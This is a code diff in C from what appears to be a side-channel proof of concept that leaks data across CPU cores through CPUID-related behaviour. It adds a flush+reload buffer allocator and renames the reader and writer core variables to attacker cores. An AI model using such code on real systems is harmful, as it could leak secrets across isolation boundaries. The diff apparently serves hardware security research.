@@ -24,7 +24,7 @@
 #define CPUID_THERMAL_STRING_PRIMITIVE 0x6
 
 int _page_size = 0x1000;
-int writer_cpu = 3, reader_cpu = 7, offcore_cpu = 1, pid = 0, pid2 = 0;
+int attacker_cpu1 = 3, attacker_cpu2 = 7, offcore_cpu = 1, pid = 0, pid2 = 0;
 
 int vector_hits[64][256];
 uint8_t vector[64];
@@ -69,6 +69,14 @@ void get_same_core_cpus(int *a, int *b) {
     fclose(cpuinfo_fd);
 }
 
+uint8_t* allocate_flush_reload_buffer(){
+    uint8_t *mem =
+            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
+                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
+    memset(mem, 0xFF, _page_size * 256);
+    return mem;
+}
+
 void fill_result_buffer(char* buffer, int start, int end){
     for (int k = start; k < end; k++) {
         int max = 0, max_i = -1;
@@ -88,7 +96,7 @@ void fill_result_buffer(char* buffer, int start, int end){
 }
 
 void vector_read(void *mem, int _reps, char* buffer, int start, int end, int fill_complete_buffer) {
-    set_processor_affinity(reader_cpu);
+    set_processor_affinity(attacker_cpu1);
     memset(vector, 0, sizeof(vector[0]) * 64);
     memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 256 * 64);
     int reps = _reps;
